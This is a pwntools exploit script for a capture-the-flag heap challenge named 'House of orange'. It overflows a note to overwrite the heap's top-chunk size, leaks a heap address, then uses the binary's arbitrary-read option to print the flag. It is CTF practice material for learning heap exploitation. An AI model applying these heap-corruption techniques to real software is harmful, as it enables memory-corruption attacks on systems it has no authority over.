'''
House of orange (Heap chall with no free() but require us to leak heap address)
https://sekai.team/blog/mocsctf-2022/full-of-orange
'''
from pwn import *

exe = './note'
# libc = './glibc/libc.so.6'

elf = context.binary = ELF(exe, checksec=False)
# libc = ELF(libc)

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

p = start()

def create(idx, size, data):
	p.recvuntil(b'>> ')
	p.sendline(b'1')
	p.recvuntil(b'>> ')
	p.sendline(idx)
	p.recvuntil(b'>> ')
	p.sendline(size)
	p.recvuntil(b'>> ')
	p.sendline(data)

def read(idx):
	p.recvuntil(b'>> ')
	p.sendline(b'2')
	p.recvuntil(b'>> ')
	p.sendline(idx)

def load_flag():
	p.recvuntil(b'>> ')
	p.sendline(b'3')

def arb_read(addr):
	p.recvuntil(b'>> ')
	p.sendline(b'69')
	p.recvuntil(b'>> ')
	p.sendline(addr)

	return True

load_flag()
payload = b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB' + p64(0xa21)

create(b'0', b'70', payload)
create(b'2', b'4096', b'AAAAAAAA')
create(b'3', b'256', b'AAAAAAAAAAAAAAA')
read(b'3')
p.recvline()
leaked_heap = u64(p.recvline().strip().ljust(8,b'\0'))
print(f'[+] leaked heap: {hex(leaked_heap)}')
flag = leaked_heap - 0x160
arb_read(hex(flag).encode())
p.recvuntil(b'Content : ')
print(f'Flag: {p.recvline().decode()}')
